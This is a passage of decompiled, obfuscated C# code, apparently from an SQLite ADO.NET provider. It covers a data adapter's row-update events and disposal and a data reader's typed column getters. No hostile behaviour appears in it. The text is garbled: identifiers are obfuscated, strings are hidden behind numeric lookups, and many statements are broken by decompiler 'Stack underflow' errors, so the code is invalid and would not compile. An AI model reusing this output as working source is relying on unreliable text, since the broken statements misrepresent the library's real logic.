				//IL_005e: Incompatible stack heights: 0 vs 1
				//IL_0068: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0013)/*Error near IL_0065: Stack underflow*/);
				EventHandler<RowUpdatingEventArgs> eventHandler = (EventHandler<RowUpdatingEventArgs>)((Component)/*Error near IL_000b: Stack underflow*/).Events[_0013.m__0001];
				if (eventHandler != null && value.Target is DbCommandBuilder)
				{
					EventHandler<RowUpdatingEventArgs> eventHandler2 = (EventHandler<RowUpdatingEventArgs>)global::_0011._0018._0001((MulticastDelegate)eventHandler);
					if (eventHandler2 != null)
					{
						base.Events.RemoveHandler(_0013.m__0001, eventHandler2);
					}
				}
				base.Events.AddHandler(_0013.m__0001, value);
			}
			remove
			{
				//IL_0018: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0013)/*Error near IL_001f: Stack underflow*/);
				((Component)/*Error near IL_000b: Stack underflow*/).Events.RemoveHandler(_0013.m__0001, value);
			}
		}

		public event EventHandler<RowUpdatedEventArgs> RowUpdated
		{
			add
			{
				//IL_0018: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0013)/*Error near IL_001f: Stack underflow*/);
				((Component)/*Error near IL_000b: Stack underflow*/).Events.AddHandler(_0013._0002, value);
			}
			remove
			{
				//IL_0018: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0013)/*Error near IL_001f: Stack underflow*/);
				((Component)/*Error near IL_000b: Stack underflow*/).Events.RemoveHandler(_0013._0002, value);
			}
		}

		public _0013()
		{
		}

		public _0013(global::_0010._001C _001A_0013)
		{
			SelectCommand = _001A_0013;
			this.m__0001 = false;
		}

		public _0013(string _0096_0017_0006, _0017._0080 _001B_0013_0006)
		{
			SelectCommand = new global::_0010._001C(_0096_0017_0006, _001B_0013_0006);
		}

		public _0013(string _0096_0017_0006, string _0098_0017_0006)
			: this(_0096_0017_0006, _0098_0017_0006, _0096_0019_0006: false)
		{
		}

		public _0013(string _0096_0017_0006, string _0098_0017_0006, bool _0096_0019_0006)
		{
			_0017._0080 obj = new _0017._0080(_0098_0017_0006, _0096_0019_0006);
			SelectCommand = new global::_0010._001C(_0096_0017_0006, obj);
		}

		protected override void _0001(bool _0002)
		{
			//IL_00a4: Incompatible stack heights: 0 vs 1
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b0: Incompatible stack heights: 0 vs 1
			try
			{
				if (!((_0013)/*Error near IL_000a: Stack underflow*/)._0002 && (int)/*Error near IL_0019: Stack underflow*/ != 0)
				{
					if (((_0013)/*Error near IL_0023: Stack underflow*/).m__0001 && SelectCommand != null)
					{
						global::_0008._007E_000F_0002(SelectCommand);
						SelectCommand = null;
					}
					if (InsertCommand != null)
					{
						global::_0008._007E_000F_0002(InsertCommand);
						InsertCommand = null;
					}
					if (UpdateCommand != null)
					{
						global::_0008._007E_000F_0002(UpdateCommand);
						UpdateCommand = null;
					}
					if (DeleteCommand != null)
					{
						global::_0008._007E_000F_0002(DeleteCommand);
						DeleteCommand = null;
					}
				}
			}
			finally
			{
				global::_0005._008E(this, _0002);
				this._0002 = true;
			}
		}

		protected override void _0001(RowUpdatingEventArgs _0002)
		{
			//IL_0028: Incompatible stack heights: 0 vs 3
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_ = _008C_0004._007E_0004_000E;
			_ = _008B_0004._0003_000E;
			/*Error near IL_002f: Stack underflow*/((object)/*Error near IL_002f: Stack underflow*/);
			object obj = _0013.m__0001;
			/*Error near IL_0036: Stack underflow*/((object)/*Error near IL_0036: Stack underflow*/, obj);
			if (/*Error near IL_0016: Stack underflow*/ is EventHandler<RowUpdatingEventArgs> eventHandler)
			{
				eventHandler(this, _0002);
			}
		}

		protected override void _0001(RowUpdatedEventArgs _0002)
		{
			//IL_0028: Incompatible stack heights: 0 vs 3
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_ = _008C_0004._007E_0004_000E;
			_ = _008B_0004._0003_000E;
			/*Error near IL_002f: Stack underflow*/((object)/*Error near IL_002f: Stack underflow*/);
			object obj = _0013._0002;
			/*Error near IL_0036: Stack underflow*/((object)/*Error near IL_0036: Stack underflow*/, obj);
			if (/*Error near IL_0016: Stack underflow*/ is EventHandler<RowUpdatedEventArgs> eventHandler)
			{
				eventHandler(this, _0002);
			}
		}

		static _0013()
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			new object();
			_0013.m__0001 = (object)/*Error near IL_0007: Stack underflow*/;
			new object();
			_0013._0002 = (object)/*Error near IL_000e: Stack underflow*/;
		}
	}
}
namespace _0011
{
	internal sealed class _0014 : DbDataReader
	{
		internal sealed class _0001 : IEqualityComparer<_0001>
		{
			public string _0001;

			public string _0002;

			public string _0003;

			public _0001()
			{
			}

			public _0001(string _0002_001A_0006, string _0017_001E_0006, string _0088_0014_0006)
				: this()
			{
				this._0001 = _0002_001A_0006;
				_0002 = _0017_001E_0006;
				_0003 = _0088_0014_0006;
			}

			public bool _0001(_0001 _0002, _0001 _0003)
			{
				//IL_0067: Incompatible stack heights: 0 vs 1
				//IL_006d: Incompatible stack heights: 0 vs 1
				//IL_0073: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0004: Stack underflow*/ == 0 && (int)/*Error near IL_0008: Stack underflow*/ == 0)
				{
					return true;
				}
				if ((int)/*Error near IL_000e: Stack underflow*/ == 0 || _0003 == null)
				{
					return false;
				}
				if (!_0099_0003._0099_0007(_0002._0001, _0003._0001, StringComparison.OrdinalIgnoreCase))
				{
					return false;
				}
				if (!_0099_0003._0099_0007(_0002._0002, _0003._0002, StringComparison.OrdinalIgnoreCase))
				{
					return false;
				}
				if (!_0099_0003._0099_0007(_0002._0003, _0003._0003, StringComparison.OrdinalIgnoreCase))
				{
					return false;
				}
				return true;
			}

			bool IEqualityComparer<_0001>.Equals(_0001 _0002, _0001 _0003)
			{
				//ILSpy generated this explicit interface implementation from .override directive in 
				return this._0001(_0002, _0003);
			}

			public int _0001(_0001 _0002)
			{
				//IL_0065: Incompatible stack heights: 0 vs 1
				//IL_0068: Incompatible stack heights: 0 vs 1
				int num = 0;
				if ((int)/*Error near IL_0007: Stack underflow*/ != 0 && ((_0001)/*Error near IL_000e: Stack underflow*/)._0001 != null)
				{
					num ^= global::_001A._007E_001B_0003(_0002._0001);
				}
				if (_0002 != null && _0002._0002 != null)
				{
					num ^= global::_001A._007E_001B_0003(_0002._0002);
				}
				if (_0002 != null && _0002._0003 != null)
				{
					num ^= global::_001A._007E_001B_0003(_0002._0003);
				}
				return num;
			}

			int IEqualityComparer<_0001>.GetHashCode(_0001 _0002)
			{
				//ILSpy generated this explicit interface implementation from .override directive in 
				return this._0001(_0002);
			}
		}

		internal global::_0010._001C _0001;

		internal SQLiteConnectionFlags _0001;

		private int m__0001;

		internal global::_0013._0017 _0001;

		internal int _0002;

		private int m__0003;

		internal int _0004;

		private int _0005;

		private Dictionary<string, int> m__0001;

		internal _001F._0018[] _0001;

		private CommandBehavior m__0001;

		internal bool _0001;

		internal bool _0002;

		internal _001F._0019 _0001;

		internal int _0006;

		internal string _0001;

		internal bool _0003;

		public override int Depth
		{
			get
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				_0018._0001((_0014)/*Error near IL_0015: Stack underflow*/);
				_0018._0001((_0014)/*Error near IL_000b: Stack underflow*/);
				return 0;
			}
		}

		public override int FieldCount
		{
			get
			{
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_0018._0001((_0014)/*Error near IL_0035: Stack underflow*/);
				_0018._0001((_0014)/*Error near IL_000b: Stack underflow*/);
				if (this._0001 == null)
				{
					return this._0004;
				}
				return this._0004 + this._0001.Count;
			}
		}

		public int StepCount
		{
			get
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 1
				_0018._0001((_0014)/*Error near IL_001a: Stack underflow*/);
				_0018._0001((_0014)/*Error near IL_000b: Stack underflow*/);
				return _0005;
			}
		}

		internal int PrivateVisibleFieldCount => ((_0014)/*Error near IL_0007: Stack underflow*/)._0004;

		public override int VisibleFieldCount
		{
			get
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 1
				_0018._0001((_0014)/*Error near IL_001a: Stack underflow*/);
				_0018._0001((_0014)/*Error near IL_000b: Stack underflow*/);
				return this._0004;
			}
		}

		public override bool HasRows
		{
			get
			{
				//IL_0043: Incompatible stack heights: 0 vs 1
				//IL_004d: Incompatible stack heights: 0 vs 1
				_0018._0001((_0014)/*Error near IL_004a: Stack underflow*/);
				_0018._0001((_0014)/*Error near IL_000b: Stack underflow*/);
				if ((this._0001 & SQLiteConnectionFlags.StickyHasRows) == SQLiteConnectionFlags.StickyHasRows)
				{
					if (this._0002 == 1)
					{
						return _0005 > 0;
					}
					return true;
				}
				return this._0002 != 1;
			}
		}

		public override bool IsClosed
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				_0018._0001((_0014)/*Error near IL_0017: Stack underflow*/);
				return ((_0014)/*Error near IL_000b: Stack underflow*/)._0001 == null;
			}
		}

		public override int RecordsAffected
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
				return ((_0014)/*Error near IL_000b: Stack underflow*/).m__0003;
			}
		}

		public override object this[string _0002]
		{
			get
			{
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0028: Incompatible stack heights: 0 vs 2
				_0018._0001((_0014)/*Error near IL_0025: Stack underflow*/);
				_ = _008F_0004._007E_0015_000E;
				int num = _008A_0004._007E_009E_0008(this, _0002);
				return /*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/, num);
			}
		}

		public override object this[int _0002]
		{
			get
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				_0018._0001((_0014)/*Error near IL_001a: Stack underflow*/);
				_ = _008F_0004._007E_0015_000E;
				return /*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, _0002);
			}
		}

		internal _0014(global::_0010._001C _001A_0013, CommandBehavior _0015_001E_0006)
		{
			this._0002 = true;
			this._0001 = _001A_0013;
			_0006 = this._0001.Connection._0017;
			this._0001 = this._0001.Connection._0014;
			this.m__0001 = _0015_001E_0006;
			this.m__0001 = -1;
			this.m__0003 = -1;
			_0018._0001(this);
			global::_0017._0080._0001(_0018._0001(this), new global::_0002._001A(global::_000E._001D._000F, null, null, this._0001, this, null, null, new object[1] { _0015_001E_0006 }));
			if (this._0001 != null)
			{
				NextResult();
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_00ce: Incompatible stack heights: 0 vs 1
			//IL_00d8: Incompatible stack heights: 0 vs 1
			//IL_00de: Incompatible stack heights: 0 vs 4
			_0018._0001((_0014)/*Error near IL_00d8: Stack underflow*/);
			_ = 13;
			_ = null;
			_ = null;
			global::_0017._0080._0001(_0003: new global::_0002._001A(_0008_0019: ((_0014)/*Error near IL_0018: Stack underflow*/)._0001, _001D_0017_0006: this, _0015_0019_0006: null, _0019_008E_0003: null, _0087_000F: new object[9] { _0002, this._0003, this.m__0001, this._0002, this.m__0003, _0005, this._0004, this._0001, this._0002 }, _0014_0019_0006: (global::_000E._001D)/*Error near IL_00a2: Stack underflow*/, _001E_009E_0005: (StateChangeEventArgs)/*Error near IL_00a2: Stack underflow*/, _0004_0018_0006: (IDbTransaction)/*Error near IL_00a2: Stack underflow*/), _0002: (global::_0017._0080)/*Error near IL_00a7: Stack underflow*/);
			try
			{
				if (!this._0003)
				{
					this._0002 = false;
				}
			}
			finally
			{
				global::_0005._008F(this, _0002);
				this._0003 = true;
			}
		}

		public override void _0001()
		{
			//IL_0149: Incompatible stack heights: 0 vs 1
			//IL_0159: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0153: Stack underflow*/);
			global::_0017._0080._0001(_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/), new global::_0002._001A(global::_000E._001D._0015, null, null, this._0001, this, null, null, new object[7] { this.m__0001, this._0002, this.m__0003, _0005, this._0004, this._0001, this._0002 }));
			try
			{
				if (this._0001 != null)
				{
					try
					{
						try
						{
							if (_0006 != 0)
							{
								try
								{
									while (global::_001B._007E_008E_0003(this))
									{
									}
								}
								catch (SQLiteException)
								{
								}
							}
							this._0001._0001 = null;
						}
						finally
						{
							if ((this.m__0001 & CommandBehavior.CloseConnection) != 0 && this._0001.Connection != null)
							{
								global::_0008._007E_0010_0002(this._0001.Connection);
							}
						}
					}
					finally
					{
						if (this._0001)
						{
							global::_0008._007E_000F_0002(this._0001);
						}
					}
				}
				this._0001 = null;
				this._0001 = null;
				this.m__0001 = null;
				this._0001 = null;
			}
			finally
			{
				if (this._0001 != null)
				{
					this._0001._0001();
					this._0001 = null;
				}
			}
		}

		public override IEnumerator _0001()
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0021: Stack underflow*/);
			return new DbEnumerator(closeReader: (this.m__0001 & CommandBehavior.CloseConnection) == CommandBehavior.CloseConnection, reader: (IDataReader)/*Error near IL_0018: Stack underflow*/);
		}

		public override bool _0001(int _0002)
		{
			//IL_00cb: Incompatible stack heights: 0 vs 1
			//IL_00db: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00d5: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107398031), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107398046));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			_0018._0001(this, _0002, DbType.Boolean);
			return _0090_0004._0018_000E(_008F_0004._007E_0015_000E(this, _0002), _008F_0003._008C_0007());
		}

		public override byte _0001(int _0002)
		{
			//IL_00e7: Incompatible stack heights: 0 vs 1
			//IL_00f7: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00f1: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107398005), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!((int?)obj._0001).HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397960));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			_0018._0001(this, _0002, DbType.Byte);
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override long _0001(int _0002, long _0003, byte[] _0004, int _0005, int _0006)
		{
			//IL_00f4: Incompatible stack heights: 0 vs 1
			//IL_0104: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00fe: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0003._0014 obj = new global::_0003._0014(_0003, _0004, _0005, _0006);
				global::_0013._0015 obj2 = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397923), obj, obj2), ref flag, this, _0002);
				if (flag)
				{
					byte[] array = obj2._0001;
					if (array != null)
					{
						_0091_0004._0019_000E(array, obj._0001, obj._0001, obj._0001, obj._0002);
						return obj._0002;
					}
					return -1L;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj3 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, obj3, _0006, _0005, _0004, _0003);
			}
			_0018._0001(this, _0002, DbType.Binary);
			return this._0001._0001._0001(this._0001, _0002, (int)_0003, _0004, _0005, _0006);
		}

		public override char _0001(int _0002)
		{
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00f8: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00f2: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397942), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!((int?)obj._0001).HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397897));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			_0018._0001(this, _0002, DbType.SByte);
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override long _0001(int _0002, long _0003, char[] _0004, int _0005, int _0006)
		{
			//IL_0110: Incompatible stack heights: 0 vs 1
			//IL_0120: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_011a: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0003._0014 obj = new global::_0003._0014(_0003, _0004, _0005, _0006);
				global::_0013._0015 obj2 = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397344), obj, obj2), ref flag, this, _0002);
				if (flag)
				{
					char[] array = obj2._0001;
					if (array != null)
					{
						_0091_0004._0019_000E(array, obj._0001, obj._0001, obj._0001, obj._0002);
						return obj._0002;
					}
					return -1L;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj3 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, _0005, obj3, _0003, _0006, _0004);
			}
			if ((this._0001 & SQLiteConnectionFlags.NoVerifyTextAffinity) != SQLiteConnectionFlags.NoVerifyTextAffinity)
			{
				_0018._0001(this, _0002, DbType.String);
			}
			return this._0001._0001._0001(this._0001, _0002, (int)_0003, _0004, _0005, _0006);
		}

		public override string _0001(int _0002)
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0052: Stack underflow*/);
			int num = this._0004;
			if ((int)/*Error near IL_000e: Stack underflow*/ >= num && this._0001 != null)
			{
				_001F._0019 obj = this._0001;
				int num2 = _0002 - this._0004;
				return _0018._0001(num2, obj);
			}
			global::_0014._0017 obj2 = global::_0014._0017._0001;
			return this._0001._0001._0001(this._0001, _0002, ref obj2);
		}

		public override DateTime _0001(int _0002)
		{
			//IL_00c6: Incompatible stack heights: 0 vs 1
			//IL_00d6: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00d0: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397363), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397314));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj2 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, obj2);
			}
			_0018._0001(this, _0002, DbType.DateTime);
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override decimal _0001(int _0002)
		{
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_00ef: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00e9: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397305), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397256));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj2 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, obj2);
			}
			_0018._0001(this, _0002, DbType.Decimal);
			return _0092_0004._001A_000E(this._0001._0001._0005(this._0001, _0002), NumberStyles.AllowLeadingSign | NumberStyles.AllowDecimalPoint | NumberStyles.AllowExponent, _008F_0003._008B_0007());
		}

		public override double _0001(int _0002)
		{
			//IL_00c3: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00cd: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397247), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397234));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			_0018._0001(this, _0002, DbType.Double);
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override Type _0001(int _0002)
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0049: Stack underflow*/);
			int num = this._0004;
			if ((int)/*Error near IL_000e: Stack underflow*/ >= num && this._0001 != null)
			{
				_001F._0019 obj = this._0001;
				int num2 = _0002 - this._0004;
				return _0018._0001(num2, obj);
			}
			return _0018._0001(_0018._0001(this, this._0001, _0002));
		}

		public override float _0001(int _0002)
		{
			//IL_00d2: Incompatible stack heights: 0 vs 1
			//IL_00e2: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00dc: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397165), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397152));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj2 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, obj2);
			}
			_0018._0001(this, _0002, DbType.Single);
			return _0093_0004._001B_000E(this._0001._0001._0001(this._0001, _0002));
		}

		public override Guid _0001(int _0002)
		{
			//IL_0100: Incompatible stack heights: 0 vs 1
			//IL_0110: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_010a: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397147), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397614));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj2 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, obj2);
			}
			global::_0014._0017 obj3 = _0018._0001(this, _0002, DbType.Guid);
			if (obj3 == global::_0014._0017._0005)
			{
				byte[] array = new byte[16];
				this._0001._0001._0001(this._0001, _0002, 0, array, 0, 16);
				return new Guid(array);
			}
			return new Guid(this._0001._0001._0005(this._0001, _0002));
		}

		public override short _0001(int _0002)
		{
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00f8: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00f2: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397577), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!((int?)obj._0001).HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397596));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			_0018._0001(this, _0002, DbType.Int16);
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override int _0001(int _0002)
		{
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00d7: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00d1: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397559), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397514));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj2 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, obj2);
			}
			_0018._0001(this, _0002, DbType.Int32);
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override long _0001(int _0002)
		{
			//IL_00c3: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00cd: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397477), null, obj), ref flag, this, _0002);
				if (flag)
				{
					if (!obj._0001.HasValue)
					{
						throw new SQLiteException(_0080._0014._0001(107397496));
					}
					return obj._0001.Value;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			_0018._0001(this, _0002, DbType.Int64);
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override string _0002(int _0002)
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_004a: Stack underflow*/);
			int num = this._0004;
			if ((int)/*Error near IL_000e: Stack underflow*/ >= num && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			return this._0001._0001._0001(this._0001, _0002);
		}

		public override int _0001(string _0002)
		{
			//IL_0090: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_009a: Stack underflow*/);
			_ = ((_0014)/*Error near IL_0014: Stack underflow*/)._0002;
			if (this.m__0001 == null)
			{
				this.m__0001 = new Dictionary<string, int>(_007F_0004._008D_0008());
			}
			if (!this.m__0001.TryGetValue(_0002, out var value))
			{
				value = this._0001._0001._0001(this._0001, _0002);
